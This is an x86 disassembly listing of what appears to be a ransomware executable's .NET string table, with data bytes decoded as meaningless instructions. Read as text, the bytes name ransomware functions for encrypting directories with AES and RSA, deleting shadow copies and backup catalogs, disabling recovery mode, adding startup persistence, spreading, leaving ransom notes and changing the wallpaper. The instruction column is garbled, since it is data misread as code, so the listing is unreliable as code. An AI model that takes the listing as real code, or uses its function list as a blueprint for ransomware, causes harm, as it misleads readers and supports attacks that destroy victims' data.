  4047d0:	65 74 65             	gs je  0x404838
  4047d3:	53                   	push   %ebx
  4047d4:	68 61 64 6f 77       	push   $0x776f6461
  4047d9:	43                   	inc    %ebx
  4047da:	6f                   	outsl  %ds:(%esi),(%dx)
  4047db:	70 69                	jo     0x404846
  4047dd:	65 73 00             	gs jae 0x4047e0
  4047e0:	63 68 65             	arpl   %ebp,0x65(%eax)
  4047e3:	63 6b 64             	arpl   %ebp,0x64(%ebx)
  4047e6:	69 73 61 62 6c 65 52 	imul   $0x52656c62,0x61(%ebx),%esi
  4047ed:	65 63 6f 76          	arpl   %ebp,%gs:0x76(%edi)
  4047f1:	65 72 79             	gs jb  0x40486d
  4047f4:	4d                   	dec    %ebp
  4047f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4047f6:	64 65 00 63 68       	fs add %ah,%gs:0x68(%ebx)
  4047fb:	65 63 6b 64          	arpl   %ebp,%gs:0x64(%ebx)
  4047ff:	65 6c                	gs insb (%dx),%es:(%edi)
  404801:	65 74 65             	gs je  0x404869
  404804:	42                   	inc    %edx
  404805:	61                   	popa
  404806:	63 6b 75             	arpl   %ebp,0x75(%ebx)
  404809:	70 43                	jo     0x40484e
  40480b:	61                   	popa
  40480c:	74 61                	je     0x40486f
  40480e:	6c                   	insb   (%dx),%es:(%edi)
  40480f:	6f                   	outsl  %ds:(%esi),(%dx)
  404810:	67 00 61 70          	add    %ah,0x70(%bx,%di)
  404814:	70 4d                	jo     0x404863
  404816:	75 74                	jne    0x40488c
  404818:	65 78 53             	gs js  0x40486e
  40481b:	74 61                	je     0x40487e
  40481d:	72 74                	jb     0x404893
  40481f:	75 70                	jne    0x404891
  404821:	32 00                	xor    (%eax),%al
  404823:	61                   	popa
  404824:	70 70                	jo     0x404896
  404826:	4d                   	dec    %ebp
  404827:	75 74                	jne    0x40489d
  404829:	65 78 32             	gs js  0x40485e
  40482c:	00 73 74             	add    %dh,0x74(%ebx)
  40482f:	61                   	popa
  404830:	74 69                	je     0x40489b
  404832:	63 53 70             	arpl   %edx,0x70(%ebx)
  404835:	6c                   	insb   (%dx),%es:(%edi)
  404836:	69 74 00 61 70 70 4d 	imul   $0x754d7070,0x61(%eax,%eax,1),%esi
  40483d:	75 
  40483e:	74 65                	je     0x4048a5
  404840:	78 00                	js     0x404842
  404842:	53                   	push   %ebx
  404843:	79 73                	jns    0x4048b8
  404845:	74 65                	je     0x4048ac
  404847:	6d                   	insl   (%dx),%es:(%edi)
  404848:	2e 54                	cs push %esp
  40484a:	65 78 74             	gs js  0x4048c1
  40484d:	2e 52                	cs push %edx
  40484f:	65 67 75 6c          	gs addr16 jne 0x4048bf
  404853:	61                   	popa
  404854:	72 45                	jb     0x40489b
  404856:	78 70                	js     0x4048c8
  404858:	72 65                	jb     0x4048bf
  40485a:	73 73                	jae    0x4048cf
  40485c:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  404863:	67 65 78 00          	addr16 gs js 0x404867
  404867:	61                   	popa
  404868:	70 70                	jo     0x4048da
  40486a:	4d                   	dec    %ebp
  40486b:	75 74                	jne    0x4048e1
  40486d:	65 78 52             	gs js  0x4048c2
  404870:	65 67 65 78 00       	gs addr16 gs js 0x404875
  404875:	6d                   	insl   (%dx),%es:(%edi)
  404876:	65 73 73             	gs jae 0x4048ec
  404879:	61                   	popa
  40487a:	67 65 73 00          	addr16 gs jae 0x40487e
  40487e:	76 61                	jbe    0x4048e1
  404880:	6c                   	insb   (%dx),%es:(%edi)
  404881:	69 64 45 78 74 65 6e 	imul   $0x736e6574,0x78(%ebp,%eax,2),%esp
  404888:	73 
  404889:	69 6f 6e 73 00 53 79 	imul   $0x79530073,0x6e(%edi),%ebp
  404890:	73 74                	jae    0x404906
  404892:	65 6d                	gs insl (%dx),%es:(%edi)
  404894:	50                   	push   %eax
  404895:	61                   	popa
  404896:	72 61                	jb     0x4048f9
  404898:	6d                   	insl   (%dx),%es:(%edi)
  404899:	65 74 65             	gs je  0x404901
  40489c:	72 73                	jb     0x404911
  40489e:	49                   	dec    %ecx
  40489f:	6e                   	outsb  %ds:(%esi),(%dx)
  4048a0:	66 6f                	outsw  %ds:(%esi),(%dx)
  4048a2:	00 4d 61             	add    %cl,0x61(%ebp)
  4048a5:	69 6e 00 52 75 6e 00 	imul   $0x6e7552,0x0(%esi),%ebp
  4048ac:	73 6c                	jae    0x40491a
  4048ae:	65 65 70 4f          	gs gs jo 0x404901
  4048b2:	75 74                	jne    0x404928
  4048b4:	4f                   	dec    %edi
  4048b5:	66 54                	push   %sp
  4048b7:	65 6d                	gs insl (%dx),%es:(%edi)
  4048b9:	70 46                	jo     0x404901
  4048bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4048bc:	6c                   	insb   (%dx),%es:(%edi)
  4048bd:	64 65 72 00          	fs gs jb 0x4048c1
  4048c1:	41                   	inc    %ecx
  4048c2:	6c                   	insb   (%dx),%es:(%edi)
  4048c3:	72 65                	jb     0x40492a
  4048c5:	61                   	popa
  4048c6:	64 79 52             	fs jns 0x40491b
  4048c9:	75 6e                	jne    0x404939
  4048cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4048cc:	69 6e 67 00 72 61 6e 	imul   $0x6e617200,0x67(%esi),%ebp
  4048d3:	64 6f                	outsl  %fs:(%esi),(%dx)
  4048d5:	6d                   	insl   (%dx),%es:(%edi)
  4048d6:	5f                   	pop    %edi
  4048d7:	62 79 74             	bound  %edi,0x74(%ecx)
  4048da:	65 73 00             	gs jae 0x4048dd
  4048dd:	52                   	push   %edx
  4048de:	61                   	popa
  4048df:	6e                   	outsb  %ds:(%esi),(%dx)
  4048e0:	64 6f                	outsl  %fs:(%esi),(%dx)
  4048e2:	6d                   	insl   (%dx),%es:(%edi)
  4048e3:	00 72 61             	add    %dh,0x61(%edx)
  4048e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4048e7:	64 6f                	outsl  %fs:(%esi),(%dx)
  4048e9:	6d                   	insl   (%dx),%es:(%edi)
  4048ea:	00 52 61             	add    %dl,0x61(%edx)
  4048ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4048ee:	64 6f                	outsl  %fs:(%esi),(%dx)
  4048f0:	6d                   	insl   (%dx),%es:(%edi)
  4048f1:	53                   	push   %ebx
  4048f2:	74 72                	je     0x404966
  4048f4:	69 6e 67 00 52 61 6e 	imul   $0x6e615200,0x67(%esi),%ebp
  4048fb:	64 6f                	outsl  %fs:(%esi),(%dx)
  4048fd:	6d                   	insl   (%dx),%es:(%edi)
  4048fe:	53                   	push   %ebx
  4048ff:	74 72                	je     0x404973
  404901:	69 6e 67 46 6f 72 45 	imul   $0x45726f46,0x67(%esi),%ebp
  404908:	78 74                	js     0x40497e
  40490a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40490c:	73 69                	jae    0x404977
  40490e:	6f                   	outsl  %ds:(%esi),(%dx)
  40490f:	6e                   	outsb  %ds:(%esi),(%dx)
  404910:	00 42 61             	add    %al,0x61(%edx)
  404913:	73 65                	jae    0x40497a
  404915:	36 34 45             	ss xor $0x45,%al
  404918:	6e                   	outsb  %ds:(%esi),(%dx)
  404919:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40491c:	65 53                	gs push %ebx
  40491e:	74 72                	je     0x404992
  404920:	69 6e 67 00 72 61 6e 	imul   $0x6e617200,0x67(%esi),%ebp
  404927:	64 6f                	outsl  %fs:(%esi),(%dx)
  404929:	6d                   	insl   (%dx),%es:(%edi)
  40492a:	45                   	inc    %ebp
  40492b:	6e                   	outsb  %ds:(%esi),(%dx)
  40492c:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40492f:	65 00 65 6e          	add    %ah,%gs:0x6e(%ebp)
  404933:	63 72 79             	arpl   %esi,0x79(%edx)
  404936:	70 74                	jo     0x4049ac
  404938:	44                   	inc    %esp
  404939:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404940:	79 00                	jns    0x404942
  404942:	72 73                	jb     0x4049b7
  404944:	61                   	popa
  404945:	4b                   	dec    %ebx
  404946:	65 79 00             	gs jns 0x404949
  404949:	43                   	inc    %ebx
  40494a:	72 65                	jb     0x4049b1
  40494c:	61                   	popa
  40494d:	74 65                	je     0x4049b4
  40494f:	50                   	push   %eax
  404950:	61                   	popa
  404951:	73 73                	jae    0x4049c6
  404953:	77 6f                	ja     0x4049c4
  404955:	72 64                	jb     0x4049bb
  404957:	00 41 45             	add    %al,0x45(%ecx)
  40495a:	53                   	push   %ebx
  40495b:	5f                   	pop    %edi
  40495c:	45                   	inc    %ebp
  40495d:	6e                   	outsb  %ds:(%esi),(%dx)
  40495e:	63 72 79             	arpl   %esi,0x79(%edx)
  404961:	70 74                	jo     0x4049d7
  404963:	00 45 6e             	add    %al,0x6e(%ebp)
  404966:	63 72 79             	arpl   %esi,0x79(%edx)
  404969:	70 74                	jo     0x4049df
  40496b:	46                   	inc    %esi
  40496c:	69 6c 65 00 52 53 41 	imul   $0x45415352,0x0(%ebp,%eiz,2),%ebp
  404973:	45 
  404974:	6e                   	outsb  %ds:(%esi),(%dx)
  404975:	63 72 79             	arpl   %esi,0x79(%edx)
  404978:	70 74                	jo     0x4049ee
  40497a:	00 6c 6f 6f          	add    %ch,0x6f(%edi,%ebp,2)
  40497e:	6b 46 6f 72          	imul   $0x72,0x6f(%esi),%eax
  404982:	44                   	inc    %esp
  404983:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40498a:	69 65 73 00 63 6f 70 	imul   $0x706f6300,0x73(%ebp),%esp
  404991:	79 52                	jns    0x4049e5
  404993:	6f                   	outsl  %ds:(%esi),(%dx)
  404994:	61                   	popa
  404995:	6d                   	insl   (%dx),%es:(%edi)
  404996:	69 6e 67 00 63 6f 70 	imul   $0x706f6300,0x67(%esi),%ebp
  40499d:	79 52                	jns    0x4049f1
  40499f:	65 73 69             	gs jae 0x404a0b
  4049a2:	73 74                	jae    0x404a18
  4049a4:	46                   	inc    %esi
  4049a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4049a6:	72 41                	jb     0x4049e9
  4049a8:	64 6d                	fs insl (%dx),%es:(%edi)
  4049aa:	69 6e 00 61 64 64 4c 	imul   $0x4c646461,0x0(%esi),%ebp
  4049b1:	69 6e 6b 54 6f 53 74 	imul   $0x74536f54,0x6b(%esi),%ebp
  4049b8:	61                   	popa
  4049b9:	72 74                	jb     0x404a2f
  4049bb:	75 70                	jne    0x404a2d
  4049bd:	00 61 64             	add    %ah,0x64(%ecx)
  4049c0:	64 41                	fs inc %ecx
  4049c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4049c3:	64 4f                	fs dec %edi
  4049c5:	70 65                	jo     0x404a2c
  4049c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4049c8:	4e                   	dec    %esi
  4049c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4049ca:	74 65                	je     0x404a31
  4049cc:	00 72 65             	add    %dh,0x65(%edx)
  4049cf:	67 69 73 74 72 79 53 	imul   $0x74537972,0x74(%bp,%di),%esi
  4049d6:	74 
  4049d7:	61                   	popa
  4049d8:	72 74                	jb     0x404a4e
  4049da:	75 70                	jne    0x404a4c
  4049dc:	00 73 70             	add    %dh,0x70(%ebx)
  4049df:	72 65                	jb     0x404a46
  4049e1:	61                   	popa
  4049e2:	64 49                	fs dec %ecx
  4049e4:	74 00                	je     0x4049e6
  4049e6:	72 75                	jb     0x404a5d
  4049e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4049e9:	43                   	inc    %ebx
  4049ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4049eb:	6d                   	insl   (%dx),%es:(%edi)
  4049ec:	6d                   	insl   (%dx),%es:(%edi)
  4049ed:	61                   	popa
  4049ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4049ef:	64 00 64 65 6c       	add    %ah,%fs:0x6c(%ebp,%eiz,2)
  4049f4:	65 74 65             	gs je  0x404a5c
  4049f7:	53                   	push   %ebx
  4049f8:	68 61 64 6f 77       	push   $0x776f6461
  4049fd:	43                   	inc    %ebx
  4049fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4049ff:	70 69                	jo     0x404a6a
  404a01:	65 73 00             	gs jae 0x404a04
  404a04:	64 69 73 61 62 6c 65 	imul   $0x52656c62,%fs:0x61(%ebx),%esi
  404a0b:	52 
  404a0c:	65 63 6f 76          	arpl   %ebp,%gs:0x76(%edi)
  404a10:	65 72 79             	gs jb  0x404a8c
  404a13:	4d                   	dec    %ebp
  404a14:	6f                   	outsl  %ds:(%esi),(%dx)
  404a15:	64 65 00 64 65 6c    	fs add %ah,%gs:0x6c(%ebp,%eiz,2)
  404a1b:	65 74 65             	gs je  0x404a83
  404a1e:	42                   	inc    %edx
  404a1f:	61                   	popa
  404a20:	63 6b 75             	arpl   %ebp,0x75(%ebx)
  404a23:	70 43                	jo     0x404a68
  404a25:	61                   	popa
  404a26:	74 61                	je     0x404a89
  404a28:	6c                   	insb   (%dx),%es:(%edi)
  404a29:	6f                   	outsl  %ds:(%esi),(%dx)
  404a2a:	67 00 53 65          	add    %dl,0x65(%bp,%di)
  404a2e:	74 57                	je     0x404a87
  404a30:	61                   	popa
  404a31:	6c                   	insb   (%dx),%es:(%edi)
  404a32:	6c                   	insb   (%dx),%es:(%edi)
  404a33:	70 61                	jo     0x404a96
  404a35:	70 65                	jo     0x404a9c
  404a37:	72 00                	jb     0x404a39
  404a39:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  404a3e:	00 63 6c             	add    %ah,0x6c(%ebx)
  404a41:	70 00                	jo     0x404a43
  404a43:	41                   	inc    %ecx
  404a44:	64 64 43             	fs fs inc %ebx
  404a47:	6c                   	insb   (%dx),%es:(%edi)
  404a48:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  404a4f:	46                   	inc    %esi
  404a50:	6f                   	outsl  %ds:(%esi),(%dx)
  404a51:	72 6d                	jb     0x404ac0
  404a53:	61                   	popa
  404a54:	74 4c                	je     0x404aa2
  404a56:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  404a5d:	00 53 65             	add    %dl,0x65(%ebx)
  404a60:	74 50                	je     0x404ab2
  404a62:	61                   	popa
  404a63:	72 65                	jb     0x404aca
  404a65:	6e                   	outsb  %ds:(%esi),(%dx)
  404a66:	74 00                	je     0x404a68
  404a68:	69 6e 74 70 72 65 63 	imul   $0x63657270,0x74(%esi),%ebp
  404a6f:	6c                   	insb   (%dx),%es:(%edi)
  404a70:	70 00                	jo     0x404a72
  404a72:	63 75 72             	arpl   %esi,0x72(%ebp)
  404a75:	72 65                	jb     0x404adc
  404a77:	6e                   	outsb  %ds:(%esi),(%dx)
  404a78:	74 43                	je     0x404abd
  404a7a:	6c                   	insb   (%dx),%es:(%edi)
  404a7b:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  404a82:	00 52 65             	add    %dl,0x65(%edx)
  404a85:	67 65 78 52          	addr16 gs js 0x404adb
  404a89:	65 73 75             	gs jae 0x404b01
  404a8c:	6c                   	insb   (%dx),%es:(%edi)
  404a8d:	74 00                	je     0x404a8f
  404a8f:	4d                   	dec    %ebp
  404a90:	65 73 73             	gs jae 0x404b06
  404a93:	61                   	popa
  404a94:	67 65 00 57 6e       	add    %dl,%gs:0x6e(%bx)
  404a99:	64 50                	fs push %eax
  404a9b:	72 6f                	jb     0x404b0c
  404a9d:	63 00                	arpl   %eax,(%eax)
  404a9f:	43                   	inc    %ebx
  404aa0:	72 65                	jb     0x404b07
  404aa2:	61                   	popa
  404aa3:	74 65                	je     0x404b0a
  404aa5:	50                   	push   %eax
  404aa6:	61                   	popa
  404aa7:	72 61                	jb     0x404b0a
  404aa9:	6d                   	insl   (%dx),%es:(%edi)
  404aaa:	73 00                	jae    0x404aac
  404aac:	67 65 74 5f          	addr16 gs je 0x404b0f
  404ab0:	43                   	inc    %ebx
  404ab1:	72 65                	jb     0x404b18
  404ab3:	61                   	popa
  404ab4:	74 65                	je     0x404b1b
  404ab6:	50                   	push   %eax
  404ab7:	61                   	popa
  404ab8:	72 61                	jb     0x404b1b
  404aba:	6d                   	insl   (%dx),%es:(%edi)
  404abb:	73 00                	jae    0x404abd
  404abd:	47                   	inc    %edi
  404abe:	65 74 54             	gs je  0x404b15
  404ac1:	65 78 74             	gs js  0x404b38
  404ac4:	00 53 65             	add    %dl,0x65(%ebx)
  404ac7:	74 54                	je     0x404b1d
  404ac9:	65 78 74             	gs js  0x404b40
  404acc:	00 61 63             	add    %ah,0x63(%ecx)
  404acf:	74 69                	je     0x404b3a
  404ad1:	6f                   	outsl  %ds:(%esi),(%dx)
  404ad2:	6e                   	outsb  %ds:(%esi),(%dx)
  404ad3:	00 75 50             	add    %dh,0x50(%ebp)
  404ad6:	61                   	popa
  404ad7:	72 61                	jb     0x404b3a
  404ad9:	6d                   	insl   (%dx),%es:(%edi)
  404ada:	00 76 50             	add    %dh,0x50(%esi)
  404add:	61                   	popa
  404ade:	72 61                	jb     0x404b41
  404ae0:	6d                   	insl   (%dx),%es:(%edi)
  404ae1:	00 77 69             	add    %dh,0x69(%edi)
  404ae4:	6e                   	outsb  %ds:(%esi),(%dx)
  404ae5:	49                   	dec    %ecx
  404ae6:	6e                   	outsb  %ds:(%esi),(%dx)
  404ae7:	69 00 61 72 67 73    	imul   $0x73677261,(%eax),%eax
  404aed:	00 6c 65 6e          	add    %ch,0x6e(%ebp,%eiz,2)
  404af1:	67 74 68             	addr16 je 0x404b5c
  404af4:	00 70 6c             	add    %dh,0x6c(%eax)
  404af7:	61                   	popa
  404af8:	69 6e 54 65 78 74 00 	imul   $0x747865,0x54(%esi),%ebp
  404aff:	6c                   	insb   (%dx),%es:(%edi)
  404b00:	6f                   	outsl  %ds:(%esi),(%dx)
  404b01:	63 61 74             	arpl   %esp,0x74(%ecx)
  404b04:	69 6f 6e 00 62 79 74 	imul   $0x74796200,0x6e(%edi),%ebp
  404b0b:	65 73 54             	gs jae 0x404b62
  404b0e:	6f                   	outsl  %ds:(%esi),(%dx)
  404b0f:	42                   	inc    %edx
  404b10:	65 45                	gs inc %ebp
  404b12:	6e                   	outsb  %ds:(%esi),(%dx)
  404b13:	63 72 79             	arpl   %esi,0x79(%edx)
  404b16:	70 74                	jo     0x404b8c
  404b18:	65 64 00 70 61       	gs add %dh,%fs:0x61(%eax)
  404b1d:	73 73                	jae    0x404b92
  404b1f:	77 6f                	ja     0x404b90
  404b21:	72 64                	jb     0x404b87
  404b23:	42                   	inc    %edx
  404b24:	79 74                	jns    0x404b9a
  404b26:	65 73 00             	gs jae 0x404b29
  404b29:	66 69 6c 65 00 74 65 	imul   $0x6574,0x0(%ebp,%eiz,2),%bp
  404b30:	78 74                	js     0x404ba6
  404b32:	54                   	push   %esp
  404b33:	6f                   	outsl  %ds:(%esi),(%dx)
  404b34:	45                   	inc    %ebp
  404b35:	6e                   	outsb  %ds:(%esi),(%dx)
  404b36:	63 72 79             	arpl   %esi,0x79(%edx)
  404b39:	70 74                	jo     0x404baf
  404b3b:	00 70 75             	add    %dh,0x75(%eax)
  404b3e:	62 6c 69 63          	bound  %ebp,0x63(%ecx,%ebp,2)
  404b42:	4b                   	dec    %ebx
  404b43:	65 79 53             	gs jns 0x404b99
  404b46:	74 72                	je     0x404bba
  404b48:	69 6e 67 00 63 6f 6d 	imul   $0x6d6f6300,0x67(%esi),%ebp
  404b4f:	6d                   	insl   (%dx),%es:(%edi)
  404b50:	61                   	popa
  404b51:	6e                   	outsb  %ds:(%esi),(%dx)
  404b52:	64 73 00             	fs jae 0x404b55
  404b55:	62 61 73             	bound  %esp,0x73(%ecx)
  404b58:	65 36 34 00          	gs ss xor $0x0,%al
  404b5c:	53                   	push   %ebx
  404b5d:	79 73                	jns    0x404bd2
  404b5f:	74 65                	je     0x404bc6
  404b61:	6d                   	insl   (%dx),%es:(%edi)
  404b62:	2e 52                	cs push %edx
  404b64:	75 6e                	jne    0x404bd4
  404b66:	74 69                	je     0x404bd1
  404b68:	6d                   	insl   (%dx),%es:(%edi)
  404b69:	65 2e 49             	gs cs dec %ecx
  404b6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404b6d:	74 65                	je     0x404bd4
  404b6f:	72 6f                	jb     0x404be0
  404b71:	70 53                	jo     0x404bc6
  404b73:	65 72 76             	gs jb  0x404bec
  404b76:	69 63 65 73 00 4d 61 	imul   $0x614d0073,0x65(%ebx),%esp
  404b7d:	72 73                	jb     0x404bf2
  404b7f:	68 61 6c 41 73       	push   $0x73416c61
  404b84:	41                   	inc    %ecx
  404b85:	74 74                	je     0x404bfb
  404b87:	72 69                	jb     0x404bf2
  404b89:	62 75 74             	bound  %esi,0x74(%ebp)
  404b8c:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  404b90:	6d                   	insl   (%dx),%es:(%edi)
  404b91:	61                   	popa
  404b92:	6e                   	outsb  %ds:(%esi),(%dx)
  404b93:	61                   	popa
  404b94:	67 65 64 54          	addr16 gs fs push %esp
  404b98:	79 70                	jns    0x404c0a
  404b9a:	65 00 68 77          	add    %ch,%gs:0x77(%eax)
  404b9e:	6e                   	outsb  %ds:(%esi),(%dx)
  404b9f:	64 00 68 57          	add    %ch,%fs:0x57(%eax)
  404ba3:	6e                   	outsb  %ds:(%esi),(%dx)
  404ba4:	64 43                	fs inc %ebx
  404ba6:	68 69 6c 64 00       	push   $0x646c69
  404bab:	68 57 6e 64 4e       	push   $0x4e646e57
  404bb0:	65 77 50             	gs ja  0x404c03
  404bb3:	61                   	popa
  404bb4:	72 65                	jb     0x404c1b
  404bb6:	6e                   	outsb  %ds:(%esi),(%dx)
  404bb7:	74 00                	je     0x404bb9
  404bb9:	70 61                	jo     0x404c1c
  404bbb:	74 74                	je     0x404c31
  404bbd:	65 72 6e             	gs jb  0x404c2e
  404bc0:	00 6d 00             	add    %ch,0x0(%ebp)
  404bc3:	74 78                	je     0x404c3d
  404bc5:	74 00                	je     0x404bc7
  404bc7:	53                   	push   %ebx
  404bc8:	79 73                	jns    0x404c3d
  404bca:	74 65                	je     0x404c31
  404bcc:	6d                   	insl   (%dx),%es:(%edi)
  404bcd:	2e 52                	cs push %edx
  404bcf:	75 6e                	jne    0x404c3f
  404bd1:	74 69                	je     0x404c3c
  404bd3:	6d                   	insl   (%dx),%es:(%edi)
  404bd4:	65 2e 43             	gs cs inc %ebx
  404bd7:	6f                   	outsl  %ds:(%esi),(%dx)
  404bd8:	6d                   	insl   (%dx),%es:(%edi)
  404bd9:	70 69                	jo     0x404c44
  404bdb:	6c                   	insb   (%dx),%es:(%edi)
  404bdc:	65 72 53             	gs jb  0x404c32
  404bdf:	65 72 76             	gs jb  0x404c58
  404be2:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  404be9:	6d                   	insl   (%dx),%es:(%edi)
  404bea:	70 69                	jo     0x404c55
  404bec:	6c                   	insb   (%dx),%es:(%edi)
  404bed:	61                   	popa
  404bee:	74 69                	je     0x404c59
  404bf0:	6f                   	outsl  %ds:(%esi),(%dx)
  404bf1:	6e                   	outsb  %ds:(%esi),(%dx)
  404bf2:	52                   	push   %edx
  404bf3:	65 6c                	gs insb (%dx),%es:(%edi)
  404bf5:	61                   	popa
  404bf6:	78 61                	js     0x404c59
  404bf8:	74 69                	je     0x404c63
  404bfa:	6f                   	outsl  %ds:(%esi),(%dx)
  404bfb:	6e                   	outsb  %ds:(%esi),(%dx)
  404bfc:	73 41                	jae    0x404c3f
  404bfe:	74 74                	je     0x404c74
  404c00:	72 69                	jb     0x404c6b
  404c02:	62 75 74             	bound  %esi,0x74(%ebp)
  404c05:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  404c09:	6e                   	outsb  %ds:(%esi),(%dx)
  404c0a:	74 69                	je     0x404c75
  404c0c:	6d                   	insl   (%dx),%es:(%edi)
  404c0d:	65 43                	gs inc %ebx
  404c0f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c10:	6d                   	insl   (%dx),%es:(%edi)
  404c11:	70 61                	jo     0x404c74
  404c13:	74 69                	je     0x404c7e
  404c15:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  404c18:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  404c1f:	69 
  404c20:	62 75 74             	bound  %esi,0x74(%ebp)
  404c23:	65 00 64 6f 6e       	add    %ah,%gs:0x6e(%edi,%ebp,2)
  404c28:	74 20                	je     0x404c4a
  404c2a:	72 75                	jb     0x404ca1
  404c2c:	6e                   	outsb  %ds:(%esi),(%dx)
  404c2d:	00 44 6c 6c          	add    %al,0x6c(%esp,%ebp,2)
  404c31:	49                   	dec    %ecx
  404c32:	6d                   	insl   (%dx),%es:(%edi)
  404c33:	70 6f                	jo     0x404ca4
  404c35:	72 74                	jb     0x404cab
  404c37:	41                   	inc    %ecx
  404c38:	74 74                	je     0x404cae
  404c3a:	72 69                	jb     0x404ca5
  404c3c:	62 75 74             	bound  %esi,0x74(%ebp)
  404c3f:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  404c43:	65 72 33             	gs jb  0x404c79
  404c46:	32 2e                	xor    (%esi),%ch
  404c48:	64 6c                	fs insb (%dx),%es:(%edi)
  404c4a:	6c                   	insb   (%dx),%es:(%edi)
  404c4b:	00 3c 4d 61 69 6e 3e 	add    %bh,0x3e6e6961(,%ecx,2)
  404c52:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  404c55:	30 00                	xor    %al,(%eax)
  404c57:	53                   	push   %ebx
  404c58:	79 73                	jns    0x404ccd
  404c5a:	74 65                	je     0x404cc1
  404c5c:	6d                   	insl   (%dx),%es:(%edi)
  404c5d:	2e 54                	cs push %esp
  404c5f:	68 72 65 61 64       	push   $0x64616572
  404c64:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  404c6b:	65 61                	gs popa
  404c6d:	64 53                	fs push %ebx
  404c6f:	74 61                	je     0x404cd2
  404c71:	72 74                	jb     0x404ce7
  404c73:	00 43 53             	add    %al,0x53(%ebx)
  404c76:	24 3c                	and    $0x3c,%al
  404c78:	3e 39 5f 5f          	cmp    %ebx,%ds:0x5f(%edi)
  404c7c:	43                   	inc    %ebx
  404c7d:	61                   	popa
  404c7e:	63 68 65             	arpl   %ebp,0x65(%eax)
  404c81:	64 41                	fs inc %ecx
  404c83:	6e                   	outsb  %ds:(%esi),(%dx)
  404c84:	6f                   	outsl  %ds:(%esi),(%dx)
  404c85:	6e                   	outsb  %ds:(%esi),(%dx)
  404c86:	79 6d                	jns    0x404cf5
  404c88:	6f                   	outsl  %ds:(%esi),(%dx)
  404c89:	75 73                	jne    0x404cfe
  404c8b:	4d                   	dec    %ebp
  404c8c:	65 74 68             	gs je  0x404cf7
  404c8f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c90:	64 44                	fs inc %esp
  404c92:	65 6c                	gs insb (%dx),%es:(%edi)
  404c94:	65 67 61             	gs addr16 popa
  404c97:	74 65                	je     0x404cfe
  404c99:	31 00                	xor    %eax,(%eax)
  404c9b:	43                   	inc    %ebx
  404c9c:	6f                   	outsl  %ds:(%esi),(%dx)
  404c9d:	6d                   	insl   (%dx),%es:(%edi)
  404c9e:	70 69                	jo     0x404d09
  404ca0:	6c                   	insb   (%dx),%es:(%edi)
  404ca1:	65 72 47             	gs jb  0x404ceb
  404ca4:	65 6e                	outsb  %gs:(%esi),(%dx)
  404ca6:	65 72 61             	gs jb  0x404d0a
  404ca9:	74 65                	je     0x404d10
  404cab:	64 41                	fs inc %ecx
  404cad:	74 74                	je     0x404d23
  404caf:	72 69                	jb     0x404d1a
  404cb1:	62 75 74             	bound  %esi,0x74(%ebp)
  404cb4:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  404cb8:	76 69                	jbe    0x404d23
  404cba:	72 6f                	jb     0x404d2b
  404cbc:	6e                   	outsb  %ds:(%esi),(%dx)
  404cbd:	6d                   	insl   (%dx),%es:(%edi)
  404cbe:	65 6e                	outsb  %gs:(%esi),(%dx)
  404cc0:	74 00                	je     0x404cc2
  404cc2:	45                   	inc    %ebp
  404cc3:	78 69                	js     0x404d2e
  404cc5:	74 00                	je     0x404cc7
  404cc7:	54                   	push   %esp
  404cc8:	68 72 65 61 64       	push   $0x64616572
  404ccd:	00 53 74             	add    %dl,0x74(%ebx)
  404cd0:	61                   	popa
  404cd1:	72 74                	jb     0x404d47
  404cd3:	00 41 70             	add    %al,0x70(%ecx)
  404cd6:	70 6c                	jo     0x404d44
  404cd8:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  404cdf:	00 53 79             	add    %dl,0x79(%ebx)
  404ce2:	73 74                	jae    0x404d58
  404ce4:	65 6d                	gs insl (%dx),%es:(%edi)
  404ce6:	2e 52                	cs push %edx
  404ce8:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  404ceb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  404cf0:	6e                   	outsb  %ds:(%esi),(%dx)
  404cf1:	00 41 73             	add    %al,0x73(%ecx)
  404cf4:	73 65                	jae    0x404d5b
  404cf6:	6d                   	insl   (%dx),%es:(%edi)
  404cf7:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  404cfb:	47                   	inc    %edi
  404cfc:	65 74 45             	gs je  0x404d44
  404cff:	6e                   	outsb  %ds:(%esi),(%dx)
  404d00:	74 72                	je     0x404d74
  404d02:	79 41                	jns    0x404d45
  404d04:	73 73                	jae    0x404d79
